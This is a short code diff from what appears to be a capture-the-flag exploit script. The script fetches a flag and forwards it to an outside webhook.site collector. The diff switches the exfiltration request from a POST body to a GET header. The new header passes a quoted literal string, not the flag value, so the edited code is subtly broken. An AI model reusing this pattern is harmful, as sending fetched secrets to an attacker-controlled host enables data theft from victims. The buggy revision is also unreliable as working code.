@@ -8,9 +8,8 @@
             .then(flag => {
                 // Forward the flag content to your webhook
                 fetch("https://webhook.site/cc42d0c8-c60f-4f93-a8fa-8e2b4bd6c5e5", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                    body: "flag=" + encodeURIComponent(flag) // Send flag as payload
+                    method: "GET",
+                    headers: { "flag": "encodeURIComponent(flag)" }
                 });
             })
             .catch(err => {
